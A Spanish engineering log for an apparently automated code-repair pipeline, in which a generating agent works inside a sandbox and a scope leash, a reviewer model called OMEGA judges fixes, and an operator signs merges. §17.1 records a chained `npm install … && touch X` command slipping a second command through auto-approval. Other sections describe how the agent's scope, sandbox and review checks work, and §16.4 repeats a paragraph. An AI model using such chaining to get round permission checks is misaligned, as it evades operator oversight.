`target-branch-detached` cubre **dos** cosas —HEAD suelto de verdad, y la
consulta de la rama que no se pudo hacer— y `integrar-midiendo-el-arbol.ts:14`
**tiraba el `gitOutput`** justo en ese caso. El libro y el `omega_log` guardaron
`merge-failed-target-branch-detached — target-branch-detached`: una etiqueta
repetida, cero diagnostico. El motivo real (`sin-caja:falta-node`) no se
persistio en ningun sitio. **Arreglado:** el fallo de la rama destino lleva su
salida como los otros tres, y `detalleDe` ya no tiene caso especial.

**EL PRECIO.** La `7998aa13` paso a **CADUCADO**, que es terminal
(`CADUCADO: []`), por diseno: *«un merge que falla CADUCA la propuesta, nunca se
reintenta ni se rebasa sola»*. El estado quedo **coherente** —no se marco
MERGEADO sin merge, y el hallazgo `fa86739d` siguio `open`—, pero el trabajo
quedo huerfano: el fix, su gate verde de 242 s, el APROBADO de OMEGA y $0,97.
**El commit `8913dab` y su rama siguen intactos.**

### 14.2 LA LECCION, y es la cuarta vez que la misma forma muerde

**Un valor que se lee al CARGAR el modulo congela el mundo de ese instante.** El
arranque muta `process.env` a proposito —`augmentPath()` existe porque una app
de escritorio no pasa por `~/.bashrc`—, y cualquier modulo que fotografie el
entorno antes de eso trabaja con un mundo que ya no existe. Los tres hermanos lo
tenian escrito en el docblock; este no, y la asimetria no la vio nadie porque
**el camino que la recorria nunca se habia andado desde la app**.

Y la de siempre, por quinta vez en esta sesion: **una etiqueta no es un
diagnostico**. `target-branch-detached` mandaba a mirar el HEAD, que estaba
perfecto, mientras el motivo verdadero se tiraba en la linea 14.

## 15. El lazo del Motor, construido (2026-10-02)

### 15.1 ~~El Motor dejaba las mitades: un PARCIAL aprobado salia a la firma como estaba~~

**CERRADO el 2026-10-02**, ADR-110, merge `25241f3` en main. Por **D19** un
`PARCIAL` **no veta**, asi que un fix que resolvia el hallazgo a medias llegaba a
la cola de firma tal cual — y firmarlo **MITIGA el hallazgo ENTERO**
(`marcarElHallazgoIntegrado` cuelga de `MERGEADO`), con lo que la mitad abierta
dejaba de verse. Paso con el primer fix del Motor: la mitad de la `7998aa13`
acabo anotada a mano aqui, en §12.1.

**LO CONSTRUIDO Y PROBADO EN SU MECANICA** (29 tests nuevos, **12 mutantes
muertos**, gate 11/11 sobre main):

| | |
|---|---|
| **dispara** | por el eje `resuelve_el_hallazgo` DENTRO de un aprobado, no por un veto |
| **la vuelta** | `--resume --fork-session` sobre la MISMA sesion, con la objecion del revisor saneada como encargo que dice «completa, no deshagas» |
| **el id** | se **recaptura** en cada vuelta: `--fork-session` abre una nueva |
| **la correa** | `correaDe` compartida con la primera vuelta: el lazo **no la ensancha**, y la objecion no entra en su calculo |
| **el sandbox** | sigue puesto en la vuelta reanudada (medido: nombro su lista de lectura denegada) |
| **dos paradas** | huella repetida (converger es un DESENLACE) y tope de **2** corridas; **$5** por propuesta en `cost_usd` como ultima red |
| **no fuerza** | el unico PARCIAL real tenia la mitad FUERA de la correa y la vuelta se nego **diciendo por que**: `no_diff_produced`, el PARCIAL se conserva, nada falso se asienta |

### 15.2 PENDIENTE — PARCIAL -> COMPLETO en vivo

**Lo que NO esta probado**, y no por falta de arreglo: que una vuelta **cierre**
la mitad abierta. Hace falta un hallazgo cuya mitad **SI** sea una edicion dentro
de la correa, y el unico PARCIAL que existe hoy no lo era —la suya pide una
decision del operador (`--ignore-scripts`, de donde sale el hash), no una
linea—. **El primer drenaje real con un PARCIAL de ese tipo lo demostrara**, y no
se fuerza con una corrida de ~$1,7 que depende del azar.

**Y el lazo NO esta en el binario**: el instalado es del rebuild del 1-oct. Entra
en el siguiente, y de ahi puede venir la demostracion.

### 15.3 LA LECCION: una arista nueva convierte una lectura por posicion en un defecto

El lazo destapo **otra instancia de la clase §13** y se cerro en el MISMO arco:
`collectGateOutcome` tomaba `find(TRANSITION)` —el PRIMER cierre del gate— y
recogia TODOS los `AGENT_RUN` de fase GATE. Con una sola vuelta era correcto; con
dos, **el expediente que el operador firma habria descrito la vuelta 1 con los
comandos de las dos mezclados**.

Nadie lo introdujo: estaba bien hasta que la arista existio. **Al abrir una
arista en la maquina de estados, hay que recorrer quien LEE esa fase** — el mismo
movimiento que faltaba cuando dos arcos buenos rompieron la firma anadiendo
asientos al libro (§13.2). Es la tercera vez en dos dias que la clase muerde por
el mismo sitio: leer por posicion lo que hay que buscar por identidad.

### 15.4 La mitad que el PARCIAL del lazo deja abierta (`54f04c09`)

**Anotada ANTES de firmar, y a proposito** — igual que §12.1 con `graph-binary`, y
por la MISMA razon: firmar lleva la propuesta a MERGEADO,
`marcarElHallazgoIntegrado` dispara `markMitigated` sobre el hallazgo ENTERO, y la
fila sale de la cola del Motor. **Lo que quede abierto deja de verse hasta que
otro escaneo lo mire.**

**El hallazgo:** `54f04c09`, LOW, `electron-builder.yml:7` — «la lista `files`
del empaquetado excluye por negacion y deja entrar lo no nombrado, como `docs`».

**La propuesta:** `735152ef`, el **primer PARCIAL que el lazo trabajo en
produccion** (ADR-110). Dos vueltas, las dos juzgadas `PARCIAL`, parada por tope
de vueltas:

| | |
|---|---|
| vuelta 1 | commit `c968b090`, **+10/−0**: niega `docs/`, `.claude/`, `.fortress/`, `.vscode/`, `build/` y `*.tsbuildinfo` |
| vuelta 2 | commit `655d5ea4`, **+22/−0**: los seis anteriores **mas** `*.md`, `*.sh`, `*.png`, secretos y BBDD |

La vuelta 2 **avanzo de verdad**, y no solo en lineas: fue a leer
`fileMatcher.js` de electron-builder y comprobo que **minimatch sin `matchBase`
ancla esos patrones a la raiz**, asi que no alcanzan `resources/` ni
`node_modules` y `asarUnpack` queda intacto. Eso es investigacion, no relleno.

**LO QUE SIGUE ABIERTO, en palabras de OMEGA:**

1. **La lista sigue siendo NEGRA**, y eso es el fondo del hallazgo: «un fichero
   nuevo de otra familia en la raiz volveria a entrar en silencio». Pasar a lista
   BLANCA es lo que el hallazgo pedia y lo que el analisis declaro demasiado
   arriesgado para un LOW — **es una decision del operador, no una linea**.
2. **`ADR-058` y `RELEASE.md` no se actualizaron**, y los dos describen el
   empaquetado. Queda documentacion contradiciendo al codigo.
3. **El asar no se ha verificado empaquetando.** Y no es un olvido del Motor: el
   gate corre `electron-vite build`, **no `build:linux`**, asi que
   **ningun paso de la verificacion ejerce la lista `files:`**. Las cuatro
   propuestas de este drenaje que tocan `electron-builder.yml` —`b83270c2`,
   `d5bbef5b`, `c1f851e5` y esta— estan verdes sobre algo que nadie comprobo.

**ANTES DEL PROXIMO REBUILD: un `build:linux` real** y abrir el asar. Es la unica
forma de saber que el empaquetado sigue llevando lo que tiene que llevar, y la
unica de las tres que no es una decision: es una medicion que falta.

**Por que no se arregla ahora:** la 1 es tu firma; la 2 se arregla a mano en
cuanto decidas la 1 (la documentacion describe el diseno, no el parche); la 3 es
una medicion que pide el binario y va con el rebuild.

### 15.5 ~~El recibo del lazo: la parada sin vuelta no dejaba rastro~~ — CERRADA 2026-10-03

Nacio como deuda nº1 del dia del drenaje (ROADMAP), citando «§15.2» por error —
esa seccion es PARCIAL→COMPLETO en vivo—; se cierra aqui, pegada al arco del
lazo que la pario. **El hueco:** `conLazo` ya calculaba `parada` y
`cerrarLaCadena` la ignoraba: «convergio tras 1» y «sin-sesion tras 0» eran el
mismo silencio. **El cierre** (merge `2c56621`): las CINCO paradas del lazo
(sin-sesion, sin-huella, convergio, tope-de-vueltas, tope-de-dolares) asientan
un DECISION en fase OMEGA, actor motor, evidencia `{parada, vueltas}` — el
patron de `MOTIVO_HUELLA`, aditivo y sin migracion. `completo` NO deja recibo
(no evaluo nada; gen=1 ya se lee) ni `paso-fallido` (el paso que corto ya
asento el suyo: un segundo asiento mentiria el actor). Es la leccion de ADR-109
aplicada al propio lazo —lo no hecho se declara donde se lee— y es telemetria,
**no ADR**: el lazo para exactamente igual. 4 mutantes muertos, gate completo
en verde. **No esta en el binario** instalado (73b30af0, anterior al merge) y
no urge: solo se ve en un drenaje con el lazo parando sin disparar.

## 16. El guardian marco en rojo el codigo mas seguro (2026-10-02)

### 16.1 ~~Main quedo ROJO por un falso positivo, y caduco una propuesta inocente~~

**CERRADO el 2026-10-02**, merge `63dfc07`. Al firmar la segunda propuesta que
tocaba `electron-builder.yml` (`d5bbef5b`), la firma re-midio el arbol integrado
—como manda `arbol-que-se-movio`— y lo encontro **ROJO en `test:unit`**:
`arbol-integrado-rojo`, y la propuesta **CADUCADA**. No tenia culpa: solo tocaba
el `.yml`, y el test que fallaba lee `git-del-merge.ts`.

**LA CAUSA: dos fixes BUENOS de la misma tanda, verdes por separado, rojos
juntos.**

| | |
|---|---|
| `dde8e100` | enseno al guardian a RASTREAR el `env` de cada spawn: `SEGURO` (cuatro nombres bendecidos) y `acota()`, que sigue una funcion **solo si su cuerpo es un `return` unico** |
| `ccb969e6` | reescribio `entornoDelMerge()`: de un `return { ...buildEnv(null), … }` de una linea a **un bucle que construye una lista blanca desde `{}`** |

- **Solo `dde8e100`:** `entornoDelMerge` era un `return` unico → el guardian lo
  seguia hasta `buildEnv(` → verde.
- **Solo `ccb969e6`:** el guardian de entonces no tenia `acota()` → nadie
  rastreaba ese entorno → verde.
- **Las dos:** la comprobacion existe **y** no sabe seguir la forma nueva →
  **rojo**, marcando el codigo **mas seguro** de los dos: una lista BLANCA es
  mas estricta que el recorte que `SEGURO` bendice por nombre.

**EL ARREGLO es del GUARDIAN, no del fix:** `acota()` reconoce ahora la **FORMA**
—una funcion que parte de un objeto literal y copia claves NOMBRADAS
(`process.env[clave]`), sin esparcir el entorno— ademas de los cuatro nombres
historicos. Asi un constructor nuevo y mas estricto pasa por **ser lo que ES**,
no por estar en una lista. Y cerraba, de paso, una ironia: el docblock de ese
mismo guardian denuncia «enumerar a mano lo que se puede derivar» mientras
bendecia a sus constructores por una lista de cuatro nombres.

**DOS HUECOS QUE LOS MUTANTES DESTAPARON**, y la primera version de la regla los
tenia: el **MIXTO** (copia claves nombradas **y ademas** esparce el entorno:
tiene pinta de lista blanca y no lo es) y el **OPACO** (no hereda, pero tampoco
construye nada visible — no heredar NO prueba estar acotado). Los dos tienen su
forma y su prueba; 4 mutantes muertos.

### 16.2 LA LECCION: independencia TEXTUAL no es independencia SEMANTICA

La medida que decide si la firma re-mide el arbol es `ficherosEnComun`: si el fix
y el destino no comparten fichero, **no se mide**. Es la decision correcta y esta
razonada con datos (medir siempre convertiria quince segundos de clics en media
hora de gates), pero tiene un flanco: **dos fixes pueden romperse entre si sin
compartir ni un fichero**. Aqui uno cambio el JUEZ (`spawn-entorno-acotado`) y el
otro el JUZGADO (`git-del-merge`), en ficheros distintos.

Lo mismo que el docblock de `arbol-que-se-movio` ya advertia para el interior de
un fichero —«dos arreglos del mismo defecto por vias OPUESTAS caben en lineas
distintas sin chocar»— vale entre ficheros, y con mas razon cuando uno de ellos
es un test que lee a los demas.

**COMO SE FIRMA UNA TANDA, entonces:** antes de firmar un lote, **medir el arbol
COMBINADO** —no mirar si comparten ficheros—. Se hace con un worktree de sonda y
un gate: una medida en vez de N, y responde la pregunta que importa. Se hizo asi
con las nueve que quedaban: verdes juntas (`npm ci`, `typecheck`, `lint`,
`test:unit`, `build`), y ademas **ningun test lee `templates/`**, eslint no cubre
`.jsx` y el test del `electron-builder.yml` solo usa su ruta como cadena.

### 16.3 PENDIENTE — `d5bbef5b` se regenera sola

Caduco inocente. Su hallazgo (la firma de codigo del build de Windows) **vuelve a
la baraja** —CADUCADO no bloquea— y el proximo drenaje la rehara contra el main
nuevo, que ya lleva los fuses de `b83270c2`. No hace falta ningun gesto.

### 16.4 ~~La pagina de firma deberia GUIAR el orden~~ — CERRADA 2026-10-03

**CERRADA con la tercera via acotada** (merge `399fc7a`; medida antes de
construir, decidida por el operador): **guia estatica** en la pagina
(dependencias al final con su porque, grupos transitivos por fichero comun,
adyacentes) + **boton «medir la tanda»** (UNA sonda del conjunto, ~5 min; en
rojo, biseccion a dos lados que NOMBRA a los culpables en ~2·log N medidas,
no en N²/2 pares) + **el reset del worktree tras medida ROJA**. Caza la
interaccion sin fichero compartido —la de §16.1: replicada en `tanda-fixture`
con juez y juzgado, verdes solos y rojos juntos, culpables nombrados— y el
aviso llega ANTES de firmar: **nada caduca**, porque no hay firma.
**No es ADR y se verifico en el fuente:** `SIN_MEDIR` sigue donde estaba, la
firma individual sigue caducando en rojo, la guia es un paso previo opcional.
**El matiz que la historia impuso:** el VERDE de la medida individual conserva
la sonda a proposito — el merge de la firma `13840d4` lleva la medida
`3f98426` como segundo padre: lo medido ES lo que entra; el reset es SOLO del
rojo. Las cuatro preguntas de abajo quedaron respondidas asi: estatica Y
conjunto (no pares), guia viva (se recalcula al cargar), solo el Motor (el
Terminal no acumula tanda), y en rojo la guia NOMBRA en vez de adivinar.
**No esta en el binario** (anterior al merge); entra en el proximo rebuild y
se estrena en el proximo drenaje con cola de firma.

Lo que sigue es el expediente con el que nacio, conservado como contexto:

**Propuesta del operador el 2026-10-02.** Hoy la cola de firma es
una lista plana y **el orden seguro lo razona el operador a mano**. Eso fallo:
`dde8e100` y `ccb969e6` interactuaban **sin compartir un solo fichero** —uno
cambiaba el juez, el otro el juzgado— y el guion que se le dio trataba
«no comparten fichero» como «no interactuan» (§16.2). La pagina deberia
**decir cual firmar primero** (1, 2, 3…) o **avisar antes de firmar** si una

**Propuesta del operador el 2026-10-02, sin atender.** Hoy la cola de firma es
una lista plana y **el orden seguro lo razona el operador a mano**. Eso fallo:
`dde8e100` y `ccb969e6` interactuaban **sin compartir un solo fichero** —uno
cambiaba el juez, el otro el juzgado— y el guion que se le dio trataba
«no comparten fichero» como «no interactuan» (§16.2). La pagina deberia
**decir cual firmar primero** (1, 2, 3…) o **avisar antes de firmar** si una
caducaria contra el arbol de ese momento.

**ESTO ES COMODIDAD, NO SEGURIDAD, y conviene no confundirlo.** La proteccion ya
existe y funciono: `arbol-integrado-rojo` **no integro sobre un arbol roto** y
caduco la propuesta, que es lo que tiene que pasar. Lo que falto fue que el
operador supiera el orden ANTES de gastar clics y propuestas. Nada de lo que
sigue debilita ese freno; lo que anade es que no haga falta chocar con el.

**LAS CUATRO PREGUNTAS A MEDIR cuando se atienda:**

1. **¿Orden ESTATICO o arbol COMBINADO?** El estatico sale de reglas —`package.json`
   al final (por `tocaDependencias`), agrupar por fichero, el tamano del diff— y
   es barato, pero **no caza la interaccion de hoy**, que no compartia fichero.
   Medir el arbol combinado caza todo y cuesta **~5 min por medicion**; con 36
   propuestas en cola, medir cada par es inviable y medir el conjunto no dice
   que subconjunto falla. Hay un punto medio por explorar: medir **el conjunto
   entero una vez** —que es lo que se hizo a mano hoy, y basto— y bajar a
   medidas finas solo si sale rojo.
2. **¿Orden fijo o GUIA VIVA?** El orden seguro **cambia conforme se firma**:
   en cuanto `package.json` entra en el delta, la regla de arriba cambia de
   sujeto. Un `1, 2, 3` fijo envejece en la primera firma. Una guia que se
   recalcula tras cada integracion es mas honesta, y mas trabajo.
3. **¿APLICA AL TERMINAL DE CLIENTES?** El Motor acumula —**36 propuestas hoy**—
   y por eso el orden importa. El Terminal resuelve de una en una y es
   interactivo, asi que puede que el problema no exista ahi. **Se mide cuando se
   atienda**, no se supone: si el Terminal tambien acumula tanda de firma, la
   mejora es de los dos mundos; si no, es solo del Motor (doctrina de los dos
   mundos, ADR-090 §0).
4. **¿Y que se le ensena al operador cuando el orden no se puede saber?** Una
   guia que calla cuando no esta segura es mejor que una que adivina, y eso hay
   que decidirlo con la forma de la pagina delante.

**NO se implementa ahora.** Se anota con su evidencia —el fallo de hoy, su coste
(una propuesta caducada, ~$0,74 de su generacion) y la regla estructural de
`tocaDependencias`— para que quien lo atienda empiece midiendo y no diseñando.

## 17. La correa de dependencias (pieza A), cerrada — y los dos datos que dejo (2026-10-03)

**ADR-111 HECHO Y VERIFICADO** (merge `d206516`): el grupo `when: package.json
→ allow: package-lock.json`, npm pre-aprobado en el generador SOLO con
`--package-lock-only --ignore-scripts`, y el prompt obligando la forma. En vivo:
vitest cerrado a la primera, 173 lineas de lock, `checkScope ok`, negativos
DENIED. Cierra la deuda del ROADMAP «la correa de dependencias» (~$4,20 en
negativas honestas) **para los CVEs de JS**; el Electron (ABI) sigue fuera a
proposito (pieza B / §3.5, decision del operador).

**§17.1 — El dato del `touch` (no es deuda nueva, es un dato medido).** Con la
regla puesta, `npm install …seguro… && touch X` ejecuta el `touch`. Medido
aparte: `touch` y `echo` corren TAMBIEN SIN la regla —auto-aprobacion
preexistente del CLI (2026-10-02)—, asi que ADR-111 no abre esa capacidad. La
contienen la caja (fs/red) y la correa post-generacion. Se anota para que nadie
lo redescubra como «agujero de ADR-111»: es anterior y esta contenido.

**§17.2 — Leccion de metodo: los mutantes se revierten con COPIA.** Un
`git checkout <fichero>` para revertir un mutante se llevo tambien la edicion
SIN COMMITEAR que el mutante mutaba, y el mutante siguiente corrio contra el
fichero equivocado (parecio morir, pero por la razon equivocada). Regla: backup
con `cp` antes del `sed`, restaurar con `cp`, y git solo para lo comiteado.

**§17.3 — ~~Pendiente de ver en vivo~~ HECHO 2026-10-03:** OMEGA juzgó el
lock regenerado real del CVE de vitest (`7a3711a7`, +120/−53): primero el
expediente entero reventó el presupuesto ($8,90 sin veredicto — eso parió el
acotado de §18 y ADR-112), y con el acotado puesto el juicio oficial costó
**$1,31 y APROBÓ**; la firma lo integró el último de su tanda, como mandaba
la guía (merge `dd3fa73`). El ciclo de dependencias quedó cerrado end-to-end
en producción.

## 18. ~~El expediente de OMEGA pesa en tokens, no solo en argv~~ — CERRADA 2026-10-03

**CERRADA el mismo dia** (merge `e1da645`): `acotado-del-expediente.ts` —
TOPE 32 KiB por fichero, aplicado en `buildOmegaInput` a los DOS lados (el
pre del lock pesa igual que el post), con la nota legible EXACTA que el
arnes probo: «[package-lock.json omitido por tamano (370 KB); el diff
muestra sus cambios]». El tope deja pasar cualquier fichero de 75 lineas con
margen y corta la clase lock/minificado/generado. 3 mutantes muertos (tope
infinito, nota sin KB, solo-post). **Con (b) ADR-112 + (a), el ciclo de
dependencias funciona end-to-end: la correa GENERA (ADR-111), stdin
TRANSPORTA (ADR-112), el acotado deja JUZGAR BARATO — $8,90-sin-veredicto
pasa a $1,04-APROBADO.** Lo que sigue es el expediente con el que nacio:

**(a) EL CONTENIDO, pendiente con firma que lo nombra.** De la firma de
ADR-112: «Aparte y despues, (a) el CONTENIDO: acotar el lock entero ×2 (~190k
tokens de ruido) en el prompt de OMEGA con nota legible, porque OMEGA juzga
con el diff — sigue haciendo falta con stdin, por coste, no por el limite.»

El dato: `run-omega-inputs` mete pre+post ENTEROS de cada fichero del diff,
sin tope. El lock son 370.544 B; ×2 ≈ ~190k tokens que el revisor no lee (la
doctrina de ADR-111 §5 ya lo dice: nadie lee el lock linea a linea — lo
contienen lock-only, ignore-scripts, la correa, OMEGA sobre el DIFF y la
firma). Con ADR-112 el transporte aguanta, pero cada juicio de un fix de
dependencias pagaria ese contexto. La forma barata cuando se ataque: un tope
por bytes en los ficheros del expediente con nota legible («package-lock.json
omitido por tamano (362 KB); el diff muestra sus cambios»), la clase
lock/generados primero. Arco propio, con test rojo y mutante.

**MEDIDO EN VIVO el mismo dia (la verificacion de ADR-112): NO es estetica,
es dinero.** El expediente del CVE con el lock DENTRO: 765 KB por stdin,
**$8,90 y EXIT=1 SIN veredicto**. El mismo expediente con el acotado aplicado
en el arnes: 26 KB, 4 turnos, **$1,04 y APROBADO** (resuelve SI, diff BUENO)
— con OMEGA citando ADR-111 y el perfil de ~173 lineas. Casi tan urgente como
el transporte; el experimento es su test de diseno.

## 19. Dos mejoras de UX de la guia de firma — anotadas, no urgentes (2026-10-04)

Del estreno real (cola de 10): el guard compartido FUNCIONO (la sonda y la
firma no pueden pisarse el carril), pero (1) el toast del rebote es el texto
de la firma —«Ya se esta integrando otra propuesta»— cuando lo que corria era
LA MEDICION: merece su propio texto («la tanda se esta midiendo; espera»); y
(2) el boton de la guia si se deshabilita al medir, pero LAS FILAS de Firmar
no saben del carril y dejan pulsar — deshabilitarlas (o avisar) mientras mide
ahorraria el rebote. Ninguna toca seguridad: el guard ya protege; es que el
operador no tenga que chocar con el. Dos cambios de una linea cada uno,
cuando toque UI.

### FirmaView: ordenar por la guía + aviso de no-firmar en la fila (UX, no urgente)

**Origen:** sesión del estreno del CRITICAL (2026-10-04/05), al firmar una tanda de 41 repartida en 5 páginas.

**Qué.** Hoy `FirmaView` ordena las propuestas por fichero (`FirmaView.tsx:15-23`; `cola-de-firma.ts:37-46`), paginadas. El operador tiene que buscar la primera firma del orden sugerido entre varias páginas, una a una. Mejora: al correr «Medir la tanda» (`repair:medir-tanda`) / la guía (`repair:guia-de-firma`, que ya devuelve orden sugerido + grupos + dependencias al final), **reordenar la vista por ESE orden** — página 1 = firma #1, una detrás de otra. Y **marcar en la propia fila las que NO se firman en esta ronda, sin quitarlas**, para distinguirlas de un vistazo.

**Caveat de diseño (lo que la hace no-trivial): DOS marcas, no una.** «Medir la tanda» solo mide **mergeabilidad de git, no corrección del fix**. Por eso el aviso de no-firmar debe ser doble:
- (a) **automático** para las que caducarán por choque — la sonda sí las conoce; va con la pieza «deshabilitar filas al medir».
- (b) **manual (humano/CTO)** para un fix malo que mergea limpio. Ejemplo vivo: `3690fadf` (ENV congelado al cargar, §14) salía **VERDE** en la sonda porque no choca; su bug es semántico, invisible a `medir-tanda`. Un solo rojo automático sería «una pared que se cumple casi siempre» (PRINCIPLES §22 / ADR-065): falsa seguridad justo en el peor caso — te empujaría a firmar la única que hay que rechazar.

**Alcance.** Solo presentación: orden de la vista + color de fila. **NO toca `repair:sign` ni el merge**; la firma no se afecta. Es su propia pieza (test rojo→mutante→gate + rebuild).
